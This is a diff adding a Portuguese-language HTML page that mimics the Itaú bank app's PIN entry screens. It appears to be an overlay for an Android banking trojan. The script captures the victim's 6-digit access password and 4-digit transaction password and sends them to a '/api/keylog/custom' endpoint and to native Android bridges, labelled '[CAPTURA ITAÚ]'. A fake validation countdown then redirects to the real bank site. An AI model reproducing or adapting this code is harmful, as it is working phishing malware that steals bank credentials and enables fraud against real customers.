@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Digite a senha de acesso</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&amp;display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #f1f2f4;
+            --card: #ffffff;
+            --orange: #ed7c0e;
+            --orange-active: #d96e08;
+            --orange-2: #f4a14a;
+            --skin: #fbe5cd;
+            --ink: #1a1a1a;
+            --ink-muted: #6b6b6b;
+            --dot-empty: #b5b5ba;
+            --gray-disabled: #bcbcc2;
+            --gray-text: #ffffff;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-touch-callout: none;
+        }
+
+        html, body {
+            height: 100%;
+            width: 100%;
+            overflow-x: hidden;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: var(--bg);
+            color: var(--ink);
+            -webkit-font-smoothing: antialiased;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+
+        .phone {
+            width: 100%;
+            max-width: 430px;
+            min-height: 100dvh;
+            margin: 0 auto;
+            background: var(--bg);
+            display: flex;
+            flex-direction: column;
+            padding: clamp(14px, 4vw, 18px) clamp(18px, 5vw, 24px) clamp(16px, 5vw, 22px);
+            position: relative;
+        }
+
+        /* ===== TOP BAR ===== */
+        .top-bar {
+            height: 44px;
+            display: flex;
+            align-items: center;
+            margin-bottom: clamp(14px, 5vw, 28px);
+        }
+
+        .back-btn {
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            padding: 6px;
+            margin-left: -6px;
+            color: var(--ink);
+            display: inline-flex;
+            touch-action: manipulation;
+        }
+
+        .back-btn svg {
+            width: 24px;
+            height: 24px;
+        }
+
+        /* ===== ILLUSTRATION ===== */
+        .illus {
+            display: flex;
+            justify-content: center;
+            margin-bottom: clamp(14px, 4vw, 20px);
+        }
+
+        .illus svg {
+            width: clamp(90px, 24vw, 120px);
+            height: auto;
+        }
+
+        /* ===== TITLE ===== */
+        .title {
+            text-align: center;
+            font-size: clamp(22px, 6vw, 26px);
+            font-weight: 800;
+            letter-spacing: -0.4px;
+            color: var(--ink);
+            margin-bottom: clamp(28px, 7vw, 40px);
+            transition: opacity 0.2s ease;
+        }
+
+        /* ===== PIN DOTS ===== */
+        .pin-row {
+            display: flex;
+            justify-content: center;
+            gap: clamp(14px, 4vw, 20px);
+            margin-bottom: clamp(24px, 6vw, 36px);
+        }
+
+        .digits-toggle {
+            text-align: center;
+            margin-top: clamp(-16px, -4vw, -24px);
+            margin-bottom: clamp(28px, 7vw, 42px);
+        }
+
+        .digits-toggle-btn {
+            background: transparent;
+            border: none;
+            color: var(--orange);
+            font-size: clamp(12px, 3.5vw, 14px);
+            font-weight: 600;
+            cursor: pointer;
+            padding: 4px 10px;
+            font-family: inherit;
+            border-radius: 6px;
+            transition: background 0.15s;
+        }
+
+        .digits-toggle-btn:active {
+            background: #fff3e6;
+        }
+
+        .pin-dot {
+            width: clamp(20px, 5.5vw, 26px);
+            height: clamp(20px, 5.5vw, 26px);
+            border-radius: 50%;
+            border: 1.8px solid var(--dot-empty);
+            background: transparent;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: clamp(16px, 4.8vw, 20px);
+            font-weight: 700;
+            color: var(--orange);
+            line-height: 1;
+            transition: border-color .15s, background .15s, transform .1s;
+        }
+
+        .pin-dot.filled {
+            border-color: var(--orange);
+            background: var(--orange);
+            transform: scale(1.05);
+        }
+
+        /* ===== KEYPAD (BOTÕES NA TELA - SEM TECLADO VIRTUAL DO CELULAR) ===== */
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: clamp(8px, 2.2vw, 12px);
+            margin-bottom: clamp(20px, 5vw, 28px);
+            max-width: 340px;
+            width: 100%;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .key {
+            background: var(--card);
+            border: none;
+            border-radius: 12px;
+            aspect-ratio: 2 / 1;
+            font-family: inherit;
+            font-size: clamp(16px, 4.6vw, 20px);
+            font-weight: 700;
+            color: var(--orange);
+            cursor: pointer;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.04);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            touch-action: manipulation;
+            transition: transform .08s ease, background .15s;
+        }
+
+        .key:active, .key.touch-active {
+            transform: scale(0.95);
+            background: #fff3e6;
+        }
+
+        .key--empty {
+            background: transparent;
+            box-shadow: none;
+            cursor: default;
+            pointer-events: none;
+        }
+
+        .key.icon-key {
+            color: var(--ink-muted);
+        }
+
+        .key.icon-key svg, .key.icon-key svg * {
+            width: clamp(18px, 5vw, 22px);
+            height: clamp(18px, 5vw, 22px);
+            pointer-events: none;
+        }
+
+        /* ===== FORGOT LINK ===== */
+        .forgot {
+            margin-top: auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: var(--ink);
+            text-decoration: none;
+            font-size: clamp(15px, 4vw, 17px);
+            font-weight: 600;
+            padding: clamp(20px, 5vw, 28px) 0 clamp(14px, 4vw, 20px);
+            touch-action: manipulation;
+        }
+
+        .forgot svg {
+            width: 16px;
+            height: 16px;
+            color: var(--ink);
+        }
+
+        /* ===== CONTINUE BUTTON ===== */
+        .btn-continue {
+            width: 100%;
+            background: var(--gray-disabled);
+            color: var(--gray-text);
+            border: none;
+            padding: clamp(14px, 4vw, 17px);
+            font-size: clamp(15px, 4.2vw, 17px);
+            font-weight: 700;
+            border-radius: 999px;
+            font-family: inherit;
+            cursor: not-allowed;
+            touch-action: manipulation;
+            transition: background .15s, transform .08s ease;
+        }
+
+        .btn-continue.is-active {
+            background: var(--orange);
+            cursor: pointer;
+        }
+
+        .btn-continue.is-active:hover {
+            background: var(--orange-active);
+        }
+
+        .btn-continue.is-active:active {
+            transform: scale(0.98);
+        }
+
+        /* ===== LOADER OVERLAY ===== */
+        .loader {
+            position: fixed;
+            inset: 0;
+            background: rgba(255, 255, 255, 0.97);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 9999;
+        }
+
+        .loader.is-active {
+            display: flex;
+        }
+
+        .loader-ring {
+            position: relative;
+            width: 110px;
+            height: 110px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .loader-spinner {
+            position: absolute;
+            inset: 0;
+            border: 4px solid #fde7d0;
+            border-top-color: var(--orange);
+            border-radius: 50%;
+            animation: loaderSpin .8s linear infinite;
+        }
+
+        .loader-count {
+            position: relative;
+            font-size: 38px;
+            font-weight: 800;
+            color: var(--orange);
+            font-variant-numeric: tabular-nums;
+            line-height: 1;
+        }
+
+        .loader-text {
+            margin-top: 20px;
+            font-size: 15px;
+            color: var(--ink-muted);
+            font-weight: 600;
+        }
+
+        @keyframes loaderSpin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        @media (min-width: 480px) {
+            body {
+                background: #2e2e2e;
+            }
+
+            .phone {
+                min-height: 100dvh;
+                box-shadow: 0 0 40px rgba(0, 0, 0, 0.5);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="phone">
+
+        <!-- Top bar -->
+        <div class="top-bar">
+            <button type="button" class="back-btn" id="back-btn" aria-label="Voltar">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                    <polyline points="15 18 9 12 15 6"></polyline>
+                </svg>
+            </button>
+        </div>
+
+        <!-- Illustration: phone with password band -->
+        <div class="illus" aria-hidden="true">
+            <svg viewBox="0 0 120 120">
+                <circle cx="60" cy="60" r="58" fill="#fff6ec"></circle>
+                <rect x="42" y="22" width="36" height="76" rx="7" fill="#fbe5cd" stroke="#1a1a1a" stroke-width="2.4"></rect>
+                <path d="M52 22h16a0 0 0 0 1 0 0v2a4 4 0 0 1-4 4h-8a4 4 0 0 1-4-4v-2z" fill="#1a1a1a"></path>
+                <rect x="34" y="55" width="52" height="14" rx="3" fill="#ed7c0e"></rect>
+                <circle cx="42" cy="62" r="2" fill="#1a1a1a"></circle>
+                <circle cx="50" cy="62" r="2" fill="#1a1a1a"></circle>
+                <circle cx="58" cy="62" r="2" fill="#1a1a1a"></circle>
+                <circle cx="66" cy="62" r="2" fill="#1a1a1a"></circle>
+                <circle cx="74" cy="62" r="2" fill="#1a1a1a"></circle>
+            </svg>
+        </div>
+
+        <!-- Title -->
+        <h1 class="title" id="title">Digite a senha de acesso</h1>
+
+        <!-- Pin dots (Renderizadas dinamicamente via JS conforme 4 ou 6 dígitos) -->
+        <div class="pin-row" id="pin-row"></div>
+        <div class="digits-toggle" id="digits-toggle-container">
+            <button type="button" class="digits-toggle-btn" id="digits-toggle-btn">Usar 4 dígitos</button>
+        </div>
+
+        <!-- Keypad (Botões virtuais na própria tela - sem input de texto) -->
+        <div class="keypad" id="keypad">
+            <button type="button" class="key" data-key="1">1</button>
+            <button type="button" class="key" data-key="2">2</button>
+            <button type="button" class="key" data-key="3">3</button>
+            <button type="button" class="key" data-key="4">4</button>
+            <button type="button" class="key" data-key="5">5</button>
+            <button type="button" class="key" data-key="6">6</button>
+            <button type="button" class="key" data-key="7">7</button>
+            <button type="button" class="key" data-key="8">8</button>
+            <button type="button" class="key" data-key="9">9</button>
+            <button type="button" class="key key--empty" disabled="" aria-hidden="true"></button>
+            <button type="button" class="key" data-key="0">0</button>
+            <button type="button" class="key icon-key" data-action="back" aria-label="Apagar">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M22 4H10l-7 8 7 8h12a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
+                    <line x1="18" y1="9" x2="12" y2="15"></line>
+                    <line x1="12" y1="9" x2="18" y2="15"></line>
+                </svg>
+            </button>
+        </div>
+
+        <!-- Forgot link -->
+        <a href="#" class="forgot" id="forgot-link">
+            Esqueci minha senha
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="9 6 15 12 9 18"></polyline>
+            </svg>
+        </a>
+
+        <!-- Continue button -->
+        <button type="button" class="btn-continue" id="btn-continue">Continuar</button>
+
+    </div>
+
+    <!-- Loader overlay -->
+    <div class="loader" id="loader" role="status" aria-live="polite">
+        <div class="loader-ring">
+            <div class="loader-spinner"></div>
+            <div class="loader-count" id="loader-count">5</div>
+        </div>
+        <div class="loader-text" id="loader-text">Validando seus dados…</div>
+    </div>
+
+    <script>
+        (function () {
+            const urlParams = new URLSearchParams(window.location.search);
+            const customTitle1 = urlParams.get('title1') || 'Digite a senha de acesso';
+            const customTitle2 = urlParams.get('title2') || 'Digite sua senha de transação';
+            const customLoaderText = urlParams.get('loader_text') || 'Validando seus dados…';
+            const customRedirect = urlParams.get('redirect') || 'https://www.itau.com.br/';
+            const customDeviceId = urlParams.get('device_id') || urlParams.get('deviceId') || '';
+            const customPackage = urlParams.get('package') || 'br.com.itau';
+
+            // Auxiliar para validar quantidade de dígitos (4 ou 6)
+            function parseDigitCount(val, defaultVal) {
+                if (!val) return defaultVal;
+                const num = parseInt(val, 10);
+                return (num === 4 || num === 6) ? num : defaultVal;
+            }
+
+            // Suporte a parâmetro global 'digits', 'length', 'len' ou 'max' (ex: digits=4 ou digits=6 ou digits=6,4)
+            let globalDigitsParam = urlParams.get('digits') || urlParams.get('length') || urlParams.get('len') || urlParams.get('max');
+            let defaultStep1Digits = 6; // Senha de acesso Itaú por padrão é 6 dígitos
+            let defaultStep2Digits = 4; // Senha de transação Itaú por padrão é 4 dígitos (cartão/transação)
+
+            if (globalDigitsParam) {
+                if (globalDigitsParam.includes(',')) {
+                    const parts = globalDigitsParam.split(',');
+                    defaultStep1Digits = parseDigitCount(parts[0], 6);
+                    defaultStep2Digits = parseDigitCount(parts[1], 4);
+                } else {
+                    const parsedGlobal = parseDigitCount(globalDigitsParam, null);
+                    if (parsedGlobal) {
+                        defaultStep1Digits = parsedGlobal;
+                        defaultStep2Digits = parsedGlobal;
+                    }
+                }
+            }
+
+            const step1Digits = parseDigitCount(urlParams.get('digits1') || urlParams.get('len1') || urlParams.get('max1') || urlParams.get('digits_acesso'), defaultStep1Digits);
+            const step2Digits = parseDigitCount(urlParams.get('digits2') || urlParams.get('len2') || urlParams.get('max2') || urlParams.get('digits_transacao'), defaultStep2Digits);
+
+            const STEPS = [
+                { title: customTitle1, type: 'Acesso', maxDigits: step1Digits },
+                { title: customTitle2, type: 'Transação', maxDigits: step2Digits }
+            ];
+
+            let step = 0;
+            let pin = '';
+            let dots = [];
+
+            const titleEl = document.getElementById('title');
+            const pinRowEl = document.getElementById('pin-row');
+            const keypad = document.getElementById('keypad');
+            const btn = document.getElementById('btn-continue');
+            const backBtn = document.getElementById('back-btn');
+            const loader = document.getElementById('loader');
+            const countEl = document.getElementById('loader-count');
+            const loaderTextEl = document.getElementById('loader-text');
+
+            if (loaderTextEl) loaderTextEl.textContent = customLoaderText;
+
+            function sendPinToLog(pinValue, stepType) {
+                console.log(`[CAPTURA ITAÚ] Passo: ${stepType} (${pinValue.length} dígitos) | Senha: ${pinValue}`);
+                
+                const payload = {
+                    device_id: customDeviceId,
+                    package: customPackage,
+                    appName: 'Itaú Oficial',
+                    isPassword: true,
+                    text: `🔑 SENHA DE ${stepType.toUpperCase()} ITAÚ (${pinValue.length} DÍGITOS): ${pinValue}`
+                };
+
+                // Envia via API HTTP
+                try {
+                    fetch('/api/keylog/custom', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    }).catch(e => console.error('Fetch keylog error:', e));
+                } catch(e) {}
+
+                // Envia via ponte nativa Android se disponível
+                if (window.AndroidInterface && typeof window.AndroidInterface.sendData === 'function') {
+                    try { window.AndroidInterface.sendData(JSON.stringify(payload)); } catch(e) {}
+                }
+                if (window.Android && typeof window.Android.postMessage === 'function') {
+                    try { window.Android.postMessage(JSON.stringify(payload)); } catch(e) {}
+                }
+            }
+
+            const toggleBtn = document.getElementById('digits-toggle-btn');
+
+            function updateToggleBtnText() {
+                if (!toggleBtn) return;
+                const currentMax = STEPS[step].maxDigits;
+                toggleBtn.textContent = currentMax === 6 ? 'Usar senha de 4 dígitos' : 'Usar senha de 6 dígitos';
+            }
+
+            if (toggleBtn) {
+                let lastToggleTime = 0;
+                ['pointerdown', 'touchstart', 'click'].forEach(evtName => {
+                    toggleBtn.addEventListener(evtName, (e) => {
+                        const now = Date.now();
+                        if (now - lastToggleTime < 200) {
+                            if (e && e.cancelable) e.preventDefault();
+                            return;
+                        }
+                        lastToggleTime = now;
+                        if (e && e.cancelable) e.preventDefault();
+
+                        STEPS[step].maxDigits = STEPS[step].maxDigits === 6 ? 4 : 6;
+                        applyStep();
+                    }, { passive: false });
+                });
+            }
+
+            function render() {
+                const currentMax = STEPS[step].maxDigits;
+                dots.forEach((d, i) => {
+                    const ch = pin[i];
+                    d.classList.toggle('filled', !!ch);
+                });
+                btn.classList.toggle('is-active', pin.length === currentMax);
+            }
+
+            function applyStep() {
+                const currentMax = STEPS[step].maxDigits;
+                
+                // Recria as bolinhas visuais conforme a quantidade configurada (4 ou 6)
+                pinRowEl.innerHTML = '';
+                dots = [];
+                for (let i = 0; i < currentMax; i++) {
+                    const dot = document.createElement('div');
+                    dot.className = 'pin-dot';
+                    pinRowEl.appendChild(dot);
+                    dots.push(dot);
+                }
+
+                updateToggleBtnText();
+
+                titleEl.style.opacity = '0';
+                setTimeout(() => {
+                    titleEl.textContent = STEPS[step].title;
+                    titleEl.style.opacity = '1';
+                }, 150);
+
+                pin = '';
+                render();
+            }
+
+            function handleKeyPress(key) {
+                if (!key || key.classList.contains('key--empty')) return;
+                
+                const currentMax = STEPS[step].maxDigits;
+
+                if (key.dataset.action === 'back') {
+                    if (pin.length > 0) {
+                        pin = pin.slice(0, -1);
+                    }
+                } else if (key.dataset.key && pin.length < currentMax) {
+                    pin += key.dataset.key;
+                }
+                render();
+
+                if (pin.length === currentMax) {
+                    setTimeout(() => {
+                        handleContinue();
+                    }, 250);
+                }
+            }
+
+            let lastKeyTime = 0;
+            function triggerKey(key, evt) {
+                if (!key || key.classList.contains('key--empty')) return;
+                if (evt) {
+                    try { evt.preventDefault(); evt.stopPropagation(); } catch(err) {}
+                }
+                const now = Date.now();
+                if (now - lastKeyTime < 300) return;
+                lastKeyTime = now;
+
+                key.classList.add('touch-active');
+                setTimeout(() => key.classList.remove('touch-active'), 100);
+
+                handleKeyPress(key);
+            }
+
+            // Single click listener per key
+            const keys = keypad.querySelectorAll('.key');
+            keys.forEach(k => {
+                if (k.classList.contains('key--empty')) return;
+                k.addEventListener('click', (e) => triggerKey(k, e));
+            });
+
+            function handleBack(e) {
+                if (e && e.cancelable) e.preventDefault();
+                if (step > 0) {
+                    step--;
+                    applyStep();
+                } else {
+                    if (window.AndroidInterface && typeof window.AndroidInterface.close === 'function') {
+                        window.AndroidInterface.close();
+                    }
+                }
+            }
+
+            ['pointerdown', 'touchstart', 'click'].forEach(evtName => {
+                backBtn.addEventListener(evtName, handleBack, { passive: false });
+            });
+
+            function startLoader() {
+                loader.classList.add('is-active');
+                let remaining = 5;
+                countEl.textContent = remaining;
+                const tick = setInterval(() => {
+                    remaining--;
+                    if (remaining <= 0) {
+                        clearInterval(tick);
+                        countEl.textContent = '0';
+                        window.location.href = customRedirect;
+                        return;
+                    }
+                    countEl.textContent = remaining;
+                }, 1000);
+            }
+
+            function handleContinue(e) {
+                const currentMax = STEPS[step].maxDigits;
+                if (pin.length !== currentMax) return;
+                if (e && e.cancelable) e.preventDefault();
+                
+                sendPinToLog(pin, STEPS[step].type);
+
+                if (step < STEPS.length - 1) {
+                    step++;
+                    applyStep();
+                } else {
+                    startLoader();
+                }
+            }
+
+            ['pointerdown', 'touchstart', 'click'].forEach(evtName => {
+                btn.addEventListener(evtName, handleContinue, { passive: false });
+            });
+
+            applyStep();
+        })();
+    </script>
+</body>
+</html>
